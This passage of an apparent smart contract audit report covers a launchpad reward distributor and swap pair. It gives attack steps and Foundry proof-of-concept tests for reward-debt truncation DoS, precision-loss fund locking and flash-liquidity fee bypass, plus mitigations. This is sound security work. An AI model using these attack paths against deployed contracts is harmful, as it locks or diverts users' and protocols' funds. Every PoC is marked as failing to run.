        // Claim reverts because pending >> totalPendingRewards
        vm.startPrank(victim);
        vm.expectRevert(Distributor.ClaimAmountExceedsTotalPendingRewards.selector);
        distributor.claimRewards(address(base));
        vm.stopPrank();

        // Unstake (by launchpad) also reverts for same reason
        vm.expectRevert(Distributor.ClaimAmountExceedsTotalPendingRewards.selector);
        distributor.decreaseStake(address(base), victim, 1);
    }
}


## Suggested Mitigation
Store reward debts as full-width integers and remove lossy casts throughout the reward math:
- Change UserRewardData.baseRewardDebt and quoteRewardDebt from uint96 to uint256.
- In stake/unstake/claim, assign rewardDebt without narrowing casts (drop uint96(...)).
- In claim() and getPendingRewards(), subtract userData.{base,quote}RewardDebt directly (no uint128 casts), keeping all arithmetic in uint256.
- Optionally, add sanity checks to reject addRewards amounts that would cause acc* to exceed a configured bound if you need to guard against extreme values in adversarial environments.
These changes eliminate truncation, ensuring pending calculations and Distributor.totalPendingRewards remain consistent and non-reverting.





 **Derived From** : ERC20DecimalsMismatch

## [H-6]. Systematic reward loss for high-supply tokens due to insufficient precision factor

### Finding Severity Justification: RewardsTrackerLib uses a fixed PRECISION_FACTOR = 1e12. When totalShares is large (common for 18-decimal tokens) and pending rewards are relatively small (e.g., USDC 6 decimals), (pending * 1e12) / totalShares can truncate to zero. The subsequent update() deletes pending rewards without increasing acc*PerShare, permanently preventing any user from ever claiming those rewards. This is matured yield loss affecting all stakers and can accumulate significantly over time due to fee trickle-ins.
## Derived From Pattern/Invariant
ERC20DecimalsMismatch

## Exploit Type
ERC20DecimalsMismatch

## Location
RewardsTrackerLib.getAccRewardsPerShare

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In `RewardsTrackerLib.sol`, the `getAccRewardsPerShare` function calculates accumulated rewards using a hardcoded `PRECISION_FACTOR` of `1e12`. The formula is `acc += (pending * 1e12) / totalShares`. 

If the staking token (LaunchToken) has a high supply (e.g., 18 decimals, 1 million tokens staked = `1e24`) and the reward token has low decimals (e.g., USDC with 6 decimals), the calculation systematically truncates to zero. For instance, adding 100 USDC (`1e8`) rewards to a pool with 1M staked tokens results in `1e8 * 1e12 / 1e24 = 0`. 

The `update` function then deletes `self.pendingQuoteRewards`, effectively burning the rewards from the internal accounting without distributing them to users.

## Impact
Due to PRECISION_FACTOR = 1e12, when totalShares is very large relative to pending rewards, (pending * PRECISION_FACTOR) / totalShares truncates to 0. The subsequent update() deletes pending rewards without increasing acc*PerShare. As a result, users can never claim those rewards. Moreover, the Distributor’s totalPendingRewards mapping remains increased (since only claims decrement it), leaving the transferred tokens permanently stuck in the contract (unclaimable and unskimmable), causing lasting loss for all stakers and stranded funds in the Distributor.

## Command to Run Test


## Proof of Concept
Scenario demonstrating loss and stuck funds:
1) Create a rewards pair where launch token uses 18 decimals and staked shares are large; e.g., totalShares = 1e24 (1,000,000 tokens at 1e18 scale).
2) Add small quote rewards (e.g., 100 USDC = 100e6 units) to the pool.
3) getAccRewardsPerShare computes accDelta = (100e6 * 1e12) / 1e24 = 0 due to truncation.
4) When any action that calls update() occurs (stake/unstake/claim), the library sets accQuoteRewardPerShare unchanged and deletes pendingQuoteRewards.
5) Users’ pending rewards remain zero, so claimRewards returns 0.
6) The Distributor’s totalPendingRewards[USDC] still includes the 100 USDC (it is only decremented on successful distribution), and the tokens remain in the Distributor’s balance. Because they are accounted as pending, owner cannot skim them (skimExcessRewards checks balance - totalPendingRewards), making these tokens permanently stuck and never claimable.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "../contracts/launchpad/Distributor.sol";
import {RewardPoolDataMemory} from "../contracts/launchpad/libraries/RewardsTracker.sol";

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 private _decimals;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory n, string memory s, uint8 d) {
        name = n;
        symbol = s;
        _decimals = d;
    }

    function decimals() external view returns (uint8) { return _decimals; }
    function totalSupply() external pure returns (uint256) { return 0; }

    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transfer(address to, uint256 value) external returns (bool) {
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - value;
        balanceOf[from] -= value;
        balanceOf[to] += value;
        emit Transfer(from, to, value);
        return true;
    }

    function mint(address to, uint256 value) external {
        balanceOf[to] += value;
        emit Transfer(address(0), to, value);
    }
}

contract PrecisionLossTest is Test {
    Distributor dist;
    MockERC20 launch;
    MockERC20 usdc;

    function setUp() public {
        dist = new Distributor();
        dist.initialize(address(this)); // set test contract as launchpad
        launch = new MockERC20("LAUNCH", "LCH", 18);
        usdc = new MockERC20("USDC", "USDC", 6);

        // create rewards pair (launch as base, usdc as quote)
        dist.createRewardsPair(address(launch), address(usdc));
    }

    function testPrecisionLossBurnsAndStrandsRewards() public {
        address user = address(0xBEEF);
        uint96 shares = 1e24; // 1,000,000 tokens @ 18 decimals

        // Add initial stake so pool has shares
        dist.increaseStake(address(launch), user, shares);

        // Add small quote rewards: 100 USDC
        uint128 rewardQuote = 100e6;
        usdc.mint(address(this), rewardQuote);
        usdc.approve(address(dist), rewardQuote);
        dist.addRewards(address(launch), address(usdc), 0, rewardQuote);

        // Sanity: Distributor holds the USDC
        assertEq(usdc.balanceOf(address(dist)), rewardQuote, "Distributor must hold added USDC");

        // Claim from user triggers update(); due to precision loss, acc delta is 0 and pending is deleted
        vm.prank(user);
        dist.claimRewards(address(launch));

        // Pool view: pendingQuoteRewards wiped, accQuoteRewardPerShare unchanged (0)
        RewardPoolDataMemory memory pool = dist.getRewardsPoolData(address(launch));
        assertEq(pool.pendingQuoteRewards, 0, "Pool pendingQuoteRewards deleted");
        assertEq(pool.accQuoteRewardPerShare, 0, "No accumulator increase due to truncation");

        // User cannot claim anything
        (, uint256 pendingQuote) = dist.getPendingRewards(address(launch), user);
        assertEq(pendingQuote, 0, "User pending remains zero");

        // Tokens remain stuck in Distributor and accounted as totalPendingRewards (cannot be skimmed or claimed)
        assertEq(usdc.balanceOf(address(dist)), rewardQuote, "USDC remains in Distributor");
        assertEq(dist.totalPendingRewards(address(usdc)), rewardQuote, "Accounted as pending forever");
    }
}


## Suggested Mitigation
Two complementary fixes are recommended:
1) Prevent deletion on zero-delta: In update(), only apply and clear pending rewards if the computed per-share increment is > 0. Alternatively, compute the distributed portion and carry forward the remainder:
   - delta = (pending * PRECISION_FACTOR) / totalShares
   - if delta == 0: leave pending as-is (do not delete)
   - else: acc += delta; distributed = (delta * totalShares) / PRECISION_FACTOR; pending = pending - distributed (carry forward remainder)
   This guarantees small rewards accumulate instead of being burned by an update.
2) Increase precision: Raise PRECISION_FACTOR to at least 1e24 (or 1e36) so that typical 18-decimal share scales and 6-decimal rewards do not truncate to zero under realistic totals. Verify that acc * shares operations remain within uint256 bounds (they do with 1e36 under current uint96 shares and uint128 pending caps).
Optionally, store a per-pool precision factor or compute it dynamically based on token decimals to future-proof against extreme decimal mismatches.





 **Derived From** : Invariant Type: Arithmetic

## [H-7]. Permanent fund lock due to uint96 overflow in reward debt calculation

### Finding Severity Justification: Casting rewardDebt to uint96 in RewardsTrackerLib allows truncation when totalAccRewards exceeds 2^96-1. An attacker can permissionlessly pump accRewardPerShare by adding rewards while totalShares is minimal, then a large staker’s rewardDebt overflows on stake/claim/unstake. Subsequent pending = totalAccRewards - debt becomes massively inflated and Distributor._decreaseTotalPending reverts, causing a permanent DoS for that user’s rewards and stake operations. Impact is user fund lock with a realistic attack path.
## Derived From Pattern/Invariant
Invariant Type: Arithmetic

## Exploit Type
IntegerOverflow

## Location
Distributor.stake

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `RewardsTrackerLib.stake` function explicitly casts the result of `totalAccRewards` (calculated as `(shares * accPerShare) / 1e12`) to `uint96` when updating `user.baseRewardDebt`. Since `accRewardPerShare` is a `uint256` that accumulates over time, and `shares` can be up to `uint96`, the product can easily exceed the max value of `uint96` (~7.9e28). When this occurs, the debt value wraps/truncates. In subsequent interactions (`claim`, `unstake`, or `stake`), the pending rewards calculation `acc - debt` yields a massively inflated value because `debt` is incorrectly small. This causes `_decreaseTotalPending` to revert (due to insufficient funds/underflow protection), permanently locking the user's funds.

## Impact
Any user can cheaply and permanently DoS victims’ rewards and unstake flows due to uint96 truncation of rewardDebt. Because rewardDebt = shares * accPerShare / 1e12, and accPerShare includes pendingRewards / totalShares, when totalShares is minimal (e.g., attacker primes the pool with 1 wei of shares), a small donation to quote rewards makes accPerShare enormous. If a victim then stakes S_new shares, rewardDebt becomes S_new * pendingRewards / 1 and is cast to uint96, truncating the true value. Subsequent pending = totalAccRewards - truncatedDebt becomes huge, and Distributor._decreaseTotalPending reverts with ClaimAmountExceedsTotalPendingRewards. This locks the victim from claim/unstake. Crucially, the overflow threshold is extremely low: pendingRewards > 2^96 / S_new. With a typical S_new = 1e24 (1e6 tokens with 18 decimals), the threshold is ~79,200 base units of a 6‑decimals token (~0.0792 USDC). Thus the attack is practical and very low-cost, and affects both base and quote reward sides.

## Command to Run Test


## Proof of Concept
Attack steps (quote side example with 6‑decimals token):
1) Prime pool with minimal shares:
   - Attacker is first staker: increaseStake(launchAsset, attacker, 1). Now totalShares = 1.
2) Spike accQuoteRewardPerShare cheaply:
   - Attacker calls addRewards(launchAsset, quoteAsset, 0, q), transferring q quote tokens to Distributor.
   - Pending q is applied on next update(): accQuoteRewardPerShare += q * 1e12 / totalShares = q * 1e12 (since totalShares = 1).
3) Victim stakes a large amount S_new (e.g., 1e24 shares for 1e6 tokens with 18 decimals):
   - stake() calls update() and then sets user.quoteRewardDebt = uint96(totalAccRewards(S_new, acc)) = uint96(S_new * acc / 1e12) = uint96(S_new * q).
   - If S_new * q > 2^96 - 1, this value truncates, making stored debt far smaller than the true value.
   - Threshold for overflow: q > floor((2^96 - 1) / S_new). With S_new = 1e24, q > ~79,200 base units (~0.0792 USDC) triggers overflow.
4) Victim tries claimRewards or unstake:
   - Library computes pendingQuote = totalAccRewards(S_new, acc) - user.quoteRewardDebt ≈ S_new * q - truncatedDebt ≫ q.
   - Distributor._decreaseTotalPending(quoteAsset, pendingQuote) reverts (amount > totalPendingRewards), causing ClaimAmountExceedsTotalPendingRewards.
5) Result: Victim cannot claim or unstake (permanent DoS) unless someone donates astronomically large amounts to cover the inflated pending, which is infeasible.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";

contract ERC20Mock {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory n, string memory s, uint8 d) {
        name = n; symbol = s; decimals = d;
    }

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) {
            require(allowed >= amount, "ALLOW");
            allowance[from][msg.sender] = allowed - amount;
        }
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "BAL");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
    }
}

contract OverflowDebtDoSTest is Test {
    Distributor distributor;
    ERC20Mock base;   // launch asset (18 decimals)
    ERC20Mock quote;  // quote asset (6 decimals)

    address launchpad = address(this); // test contract acts as launchpad
    address attacker = address(0xA11CE);
    address victim = address(0xBEEF);

    function setUp() public {
        distributor = new Distributor();
        distributor.initialize(launchpad);

        base = new ERC20Mock("BASE", "BASE", 18);
        quote = new ERC20Mock("USDC", "USDC", 6);

        // Create rewards pair as launchpad
        distributor.createRewardsPair(address(base), address(quote));

        // Prime pool with minimal totalShares = 1
        distributor.increaseStake(address(base), attacker, 1);
    }

    function test_RewardDebtUint96OverflowLocksVictim() public {
        // Choose victim large stake (1e24 shares ≈ 1e6 tokens with 18 decimals)
        uint96 S_new = 1e24;

        // Compute minimal quote donation to overflow: floor(type(uint96).max / S_new) + 1
        uint256 minQ = (uint256(type(uint96).max) / uint256(S_new)) + 1; // in quote base units (6 decimals)
        // Fund and approve quote for addRewards
        quote.mint(address(this), minQ);
        quote.approve(address(distributor), minQ);

        // Add ONLY quote rewards (permissionless); totalShares == 1 so accQuote grows huge
        distributor.addRewards(address(base), address(quote), 0, uint128(minQ));

        // Victim stakes large amount via launchpad (onlyLaunchpad)
        distributor.increaseStake(address(base), victim, S_new);

        // Victim cannot claim due to overflowed (truncated) rewardDebt causing inflated pending
        vm.prank(victim);
        vm.expectRevert(Distributor.ClaimAmountExceedsTotalPendingRewards.selector);
        distributor.claimRewards(address(base));

        // Victim also cannot unstake
        vm.startPrank(launchpad);
        vm.expectRevert(Distributor.ClaimAmountExceedsTotalPendingRewards.selector);
        distributor.decreaseStake(address(base), victim, S_new);
        vm.stopPrank();
    }
}


## Suggested Mitigation
Store reward debts as full-width integers and remove lossy casts throughout the flow: 1) Change UserRewardData to use uint256 for baseRewardDebt and quoteRewardDebt. 2) In RewardsTrackerLib, stop casting totalAccRewards(...) to uint96; assign the full uint256 result to the debt fields. 3) In claim() and getPendingRewards(), remove the uint128 casts when subtracting debt; use the full-width stored debt type to compute pending. 4) Keep PRECISION_FACTOR and acc*RewardPerShare as uint256; no change needed. This aligns with standard reward-accounting patterns and prevents truncation-induced overflows and DoS. Optionally, add sanity checks in addRewards to ensure acc*RewardPerShare updates cannot overflow 256-bit math (currently safe), and consider upper-bounding shares to types that match debt arithmetic if you want tighter packing.


## [H-8]. Catastrophic reward loss for low-decimal tokens due to precision threshold

### Finding Severity Justification: Rewards accounting uses PRECISION_FACTOR=1e12 with shares typically in 18-decimal units. When totalShares is large (e.g., 1e24 from 1M 18-decimal tokens), pendingRewards * 1e12 / totalShares rounds to 0 for common 6-decimal rewards (USDC). update() then deletes pending rewards without increasing accRewardPerShare, so users accrue 0 while Distributor.totalPendingRewards tracks the full amount, making the funds unclaimable and also unskimmable by admin. This causes permanent loss/lock of matured rewards, potentially very large given realistic share sizes and USDC fees, qualifying as High severity.
## Derived From Pattern/Invariant
Invariant Type: Arithmetic

## Exploit Type
RoundingError

## Location
Distributor.addRewards

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 7
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `RewardsTrackerLib` uses a fixed precision factor of `1e12`. When updating `accRewardPerShare`, the formula is `(pendingRewards * 1e12) / totalShares`. If `pendingRewards * 1e12 < totalShares`, the integer division results in 0. For pools with standard token supplies (e.g., 1 million tokens = 1e24 wei), this requires the reward amount to be at least `1e12` raw units to register *any* increase. For 6-decimal tokens (USDC/USDT), `1e12` raw units equals **1,000,000 USDC**. Consequently, any reward distribution less than $1M is rounded down to zero, effectively burned (locked in `totalPendingRewards` but never claimable by users).

## Impact
Due to using PRECISION_FACTOR=1e12 with potentially 18-decimal shares, when pendingRewards * PRECISION_FACTOR < totalShares, the per-share increment rounds to zero. Any subsequent call to update() (stake, unstake, claim) deletes the entire pending amount without increasing accRewardPerShare. The transferred reward tokens remain escrowed under Distributor.totalPendingRewards and cannot be claimed by users nor skimmed by admin (skimExcessRewards reverts), permanently locking funds. This affects any reward token if the distribution is small relative to totalShares (not only 6-decimal tokens), and it also silently burns the rounding remainder even when increments are non-zero. Severity is High as large rewards can be trapped indefinitely.

## Command to Run Test


## Proof of Concept
1) Assume a pool where users have staked 1,000,000 launch tokens with 18 decimals (totalShares = 1e24). 2) Anyone adds 100,000 USDC (6 decimals) as quote rewards: pendingQuoteRewards = 100_000e6 = 1e11. 3) The per-share increment is (pendingQuoteRewards * 1e12) / totalShares = (1e11 * 1e12)/1e24 = 1e23/1e24 = 0. 4) A routine operation triggers update(): a user calls claimRewards(). update() sets accQuoteRewardPerShare += 0 and then deletes pendingQuoteRewards (sets it to 0). 5) The user receives 0 USDC because accQuoteRewardPerShare did not change. 6) Distributor.totalPendingRewards[USDC] remains increased by 100,000 USDC from addRewards, but since no user can claim, and skimExcessRewards checks balance - totalPending, admin cannot withdraw either; funds are permanently locked. 7) The same mechanism also burns rounding remainders even when increments are non-zero (the remainder is not carried forward).

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";
import {RewardPoolDataMemory} from "contracts/launchpad/libraries/RewardsTracker.sol";

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s, uint8 d) { name = n; symbol = s; decimals = d; }

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        require(a >= amount, "allow");
        allowance[from][msg.sender] = a - amount;
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract PrecisionLossTest is Test {
    Distributor distributor;
    MockERC20 tokenA; // 18 decimals (shares)
    MockERC20 usdc;   // 6 decimals (rewards)
    address launchpad = address(0xBEEF);

    function setUp() public {
        distributor = new Distributor();
        distributor.initialize(launchpad);
        tokenA = new MockERC20("TokenA", "TKA", 18);
        usdc = new MockERC20("USD Coin", "USDC", 6);
        vm.startPrank(launchpad);
        distributor.createRewardsPair(address(tokenA), address(usdc));
        // Stake 1,000,000 TKA (18 decimals) so totalShares = 1e24
        distributor.increaseStake(address(tokenA), address(this), uint96(1e24));
        vm.stopPrank();
    }

    function test_PrecisionLoss_and_Lock() public {
        // Add 100k USDC rewards (1e11 raw units)
        uint128 reward = 100_000e6;
        usdc.mint(address(this), reward);
        usdc.approve(address(distributor), reward);
        distributor.addRewards(address(tokenA), address(usdc), 0, reward);

        // Trigger update() via claim; with delta==0, pending is deleted and nothing is paid
        (uint256 baseAmt, uint256 quoteAmt) = distributor.claimRewards(address(tokenA));
        assertEq(baseAmt, 0, "no base rewards expected");
        assertEq(quoteAmt, 0, "no quote rewards expected");

        // Pool state: accQuoteRewardPerShare remains 0, pendingQuoteRewards cleared to 0
        RewardPoolDataMemory pool = distributor.getRewardsPoolData(address(tokenA));
        assertEq(pool.accQuoteRewardPerShare, 0, "acc should remain zero");
        assertEq(pool.pendingQuoteRewards, 0, "pending should be deleted");

        // User received nothing; rewards are locked in Distributor
        assertEq(usdc.balanceOf(address(this)), 0, "user received no USDC");
        assertEq(distributor.totalPendingRewards(address(usdc)), reward, "locked in totalPending");

        // Admin cannot skim locked rewards
        vm.expectRevert(Distributor.SkimOverflow.selector);
        distributor.skimExcessRewards(address(usdc), reward);
    }
}


## Suggested Mitigation
Fix both precision and remainder handling:
- Use 256-bit math for accrual and a larger precision factor, e.g. uint256 constant PRECISION_FACTOR = 1e36; and cast operands to uint256 before multiplication to avoid overflow: uint256 inc = (uint256(self.pendingQuoteRewards) * PRECISION_FACTOR) / uint256(totalShares);
- Do NOT delete the full pending on update(). Instead, carry forward the undistributed remainder so small rewards accumulate until they are distributable:
  if (self.pendingQuoteRewards > 0 && totalShares != 0) {
      uint256 inc = (uint256(self.pendingQuoteRewards) * PRECISION_FACTOR) / uint256(totalShares);
      if (inc != 0) {
          self.accQuoteRewardPerShare += inc;
          uint256 distributed = (inc * uint256(totalShares)) / PRECISION_FACTOR; // <= pending
          self.pendingQuoteRewards = uint128(uint256(self.pendingQuoteRewards) - distributed);
      }
      // If inc == 0, leave pendingQuoteRewards unchanged (no deletion)
  }
Apply the same logic for base rewards. This fully prevents both total-loss on small distributions and rounding remainder burn. Additionally, audit casts to uint96 for reward debts to ensure they cannot overflow given the new precision; widen debt types if necessary.





 **Derived From** : FlashLoanEconomicManipulation

## [M-9]. Protocol Fee Bypass via Flash-Liquidity Dilution

### Finding Severity Justification: An attacker can systematically bypass the launchpad fee on swaps by temporarily inflating LP totalSupply via flash-minted liquidity, causing the launchpad’s pro‑rata to round to zero. This directly deprives the protocol of matured revenue for each targeted swap but does not steal user funds or compromise pool solvency. Impact is significant and repeatable, but limited to fee diversion, not capital loss.
## Derived From Pattern/Invariant
FlashLoanEconomicManipulation

## Exploit Type
FlashLoanEconomicManipulation

## Location
GTELaunchpadV2Pair._getLaunchpadFees

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The function `_getLaunchpadFees` calculates the Launchpad's share of the swap fees based on the ratio of the Launchpad's LP balance to the total LP supply:

```solidity
fee0 = uint112(amount0In.mul(REWARDS_FEE_SHARE).mul(launchpadLpBal) / (totalLpBal * 1000));
```

`totalLpBal` is `totalSupply()`. An attacker can manipulate `totalSupply()` within a transaction by flash-minting liquidity. By increasing `totalLpBal` to a very large number, the ratio `launchpadLpBal / totalLpBal` approaches zero, resulting in `fee0` and `fee1` being calculated as 0. The full 0.3% swap fee is then retained in the reserves (which the attacker now owns the majority of), allowing them to bypass the protocol fee.

## Impact
Theft of protocol revenue. Attackers can evade the Launchpad fee, effectively paying the swap fee to themselves (as LPs) rather than the protocol.

## Command to Run Test


## Proof of Concept
Attack outline demonstrating same-tx dilution and integer rounding to zero:

Prereqs: A deployed GTELaunchpadV2Pair initialized with token0, token1, launchpadLp, and a non-zero distributor. The launchpad address holds the initial LP (via mint to launchpad). Fees accrue pro‑rata to launchpadLp balance over totalSupply.

Steps:
1) Honest user baseline: With normal totalSupply and launchpadLp holding all LP initially, a swap paying token0-in causes _getLaunchpadFees to compute a positive fee0 ≈ amount0In/1000 (since REWARDS_FEE_SHARE = 1 implies 1/3 of the 0.3% fee when launchpad share ≈ 100%). This is either accrued or immediately distributed depending on block timing.

2) Attacker preparation (same block as target swap):
   - Flash-borrow or temporarily source large amounts of token0 and token1.
   - Transfer huge amounts of both tokens to the pair and call pair.mint(attacker), inflating totalSupply by orders of magnitude within the same block. The launchpadLpBal stays constant while totalLpBal skyrockets.

3) Target swap (still same block):
   - Attacker (or any user) performs a swap with token0In > 0. The launchpad fee calculation now uses fee0 = floor(amount0In * REWARDS_FEE_SHARE * launchpadLpBal / (totalLpBal * 1000)). Because totalLpBal is massive, the integer division rounds down to zero: fee0 = 0 (and similarly fee1 if amount1In > 0).
   - Hence, no launchpad fees are accrued for this swap; the entire 0.3% swap fee remains in pool reserves.

4) Exit:
   - Attacker burns the temporary LP position to retrieve their pro-rata share of reserves, capturing almost all of the fee that should have gone to the launchpad.
   - Repay the flash loan. Net effect: launchpad protocol fee for the swap is 0; attacker captures that fee as an LP holder.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    constructor(string memory n, string memory s) { name = n; symbol = s; }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
        emit Transfer(address(0), to, amt);
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        emit Approval(msg.sender, spender, amt);
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        emit Transfer(msg.sender, to, amt);
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 al = allowance[from][msg.sender];
        if (al != type(uint256).max) {
            require(al >= amt, "allow");
            allowance[from][msg.sender] = al - amt;
        }
        require(balanceOf[from] >= amt, "bal");
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        emit Transfer(from, to, amt);
        return true;
    }
}

// Minimal distributor that accepts rewards without reverting and records totals
contract MockDistributor {
    uint256 public totalBase;
    uint256 public totalQuote;

    function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {
        // Record the amounts, no additional checks
        totalBase += amount0;
        totalQuote += amount1;
    }
}

contract FeeBypassTest is Test {
    GTELaunchpadV2Pair pair;
    MockERC20 token0;
    MockERC20 token1;
    MockDistributor dist;

    address launchpad = address(0xA11CE);
    address attacker = address(0xBEEF);

    function setUp() public {
        token0 = new MockERC20("T0", "T0");
        token1 = new MockERC20("T1", "T1");
        dist = new MockDistributor();

        // Deploy pair; constructor sets factory = msg.sender (this test contract)
        pair = new GTELaunchpadV2Pair();
        pair.initialize(address(token0), address(token1), launchpad, address(dist));

        // Seed initial liquidity credited to launchpad
        uint256 seed = 1_000 ether;
        token0.mint(address(this), seed);
        token1.mint(address(this), seed);
        token0.transfer(address(pair), seed);
        token1.transfer(address(pair), seed);
        pair.mint(launchpad);
    }

    function test_FeeBypass_RoundsLaunchpadFeeToZero() public {
        // Baseline: normal swap in next block should produce >0 launchpad fee and be distributed
        vm.warp(block.timestamp + 1);
        // Provide token0 input and take small token1 out; overpay input to satisfy invariant
        token0.mint(address(this), 20 ether);
        token0.transfer(address(pair), 10 ether);
        pair.swap(0, 9 ether, address(this), "");
        // Because timeElapsed > 0, fees are distributed via distributor
        assertGt(dist.totalBase + dist.totalQuote, 0, "baseline: fees should distribute > 0");

        // Attacker flash-mints massive LP in the SAME block to dilute totalSupply
        uint256 huge = 100_000_000 ether;
        token0.mint(attacker, huge);
        token1.mint(attacker, huge);
        vm.startPrank(attacker);
        token0.transfer(address(pair), huge);
        token1.transfer(address(pair), huge);
        pair.mint(attacker);
        // Same block as above; no warp here to keep timeElapsed == 0 for the next swap
        token0.mint(attacker, 20 ether);
        token0.transfer(address(pair), 10 ether);
        pair.swap(0, 9 ether, attacker, "");
        vm.stopPrank();

        // Since timeElapsed == 0 on this swap, fees accrue into accruedLaunchpadFee{0,1}.
        // With massive totalSupply, _getLaunchpadFees rounds down to 0 => no new accrual.
        (uint112 f0, uint112 f1, ) = pair.getAccruedLaunchpadFees();
        assertEq(f0, 0, "attack: fee0 should be 0 due to dilution rounding");
        assertEq(f1, 0, "attack: fee1 should be 0 due to dilution rounding");
    }
}


## Suggested Mitigation
Avoid using the instantaneous totalSupply in the same block as the swap to compute the launchpad’s pro‑rata. Two complementary options:

- Snapshot-based ratio: Track a supply snapshot updated only on the first state-changing call per block (e.g., supplySnapshot and snapshotBlockTimestamp). In _update, if timeElapsed > 0, set supplySnapshot = totalSupply. In _getLaunchpadFees, use supplySnapshot (and the launchpad’s LP balance at that time) to compute the ratio. This neutralizes same‑block flash LP mint/burn attacks while still allowing genuine, persistent LP changes to adjust the pro-rata over time.

- Remainder accumulation (optional hardening): Maintain a high-precision accumulator for the launchpad fee numerator and carry remainders across swaps, only materializing tokens when >= 1 full unit. This reduces loss from integer truncation, though it does not by itself solve flash-dilution.

If pro‑rata is not a strict business requirement, a simpler alternative is to allocate a fixed share of the 0.3% swap fee (e.g., fixed BPS) to the launchpad, removing dependency on LP supply altogether.





 **Derived From** : AccessControlOrAuthByPass

## [H-10]. DoS of Reward Pool via Mismatched Quote Asset in addRewards

### Finding Severity Justification: Anyone can call Distributor.addRewards with a mismatched quote token. This inflates rs.pendingQuoteRewards for a pool while increasing totalPendingRewards for an arbitrary token that is not the pool’s configured rs.quoteAsset. Subsequent claimRewards/increaseStake/decreaseStake attempt to decrease totalPendingRewards[rs.quoteAsset] and revert, effectively preventing users from claiming matured rewards and blocking stake adjustments. This is a permissionless, one-tx DoS of reward distribution with no automatic recovery, impacting all users of the pool. Loss of matured yield and protocol function unavailability warrant High severity.
## Derived From Pattern/Invariant
AccessControlOrAuthByPass

## Exploit Type
AccessControl

## Location
Distributor.addRewards

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `Distributor.addRewards` function allows any user to add rewards to a pool. It identifies the pool `rs` using `token0` (or `token1`), but fails to verify that the *other* provided token matches the pool's configured `rs.quoteAsset`. 

